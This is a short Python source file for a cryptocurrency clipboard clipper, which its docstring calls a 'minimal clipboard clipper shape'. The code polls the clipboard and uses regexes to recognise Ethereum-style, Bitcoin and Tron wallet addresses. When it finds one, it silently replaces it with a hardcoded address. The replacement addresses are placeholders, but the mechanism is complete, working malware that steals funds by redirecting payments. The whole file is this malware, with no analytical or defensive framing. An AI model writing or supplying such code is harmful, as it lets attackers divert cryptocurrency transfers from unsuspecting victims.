"""Minimal clipboard clipper shape: poll the clipboard, match the text against
a built-in table of address patterns for unrelated chains, and write back a
hardcoded replacement address from the table."""
import re
import time

import pyperclip

recognizers = [
    (re.compile(r'\b0x[a-fA-F0-9]{40}\b'), 'evm'),
    (re.compile(r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'), 'btc'),
    (re.compile(r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b'), 'tron'),
]

destinations = {
    'evm': '0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    'btc': '1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    'tron': 'TAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
}


def transform(value):
    for rx, chain in recognizers:
        if rx.fullmatch(value.strip()):
            return destinations[chain]
    return value


def run():
    last = ''
    while True:
        copied = pyperclip.paste() or ''
        if copied and copied != last:
            rewritten = transform(copied)
            if rewritten != copied:
                pyperclip.copy(rewritten)
                last = rewritten
            else:
                last = copied
        time.sleep(0.3)


if __name__ == '__main__':
    run()
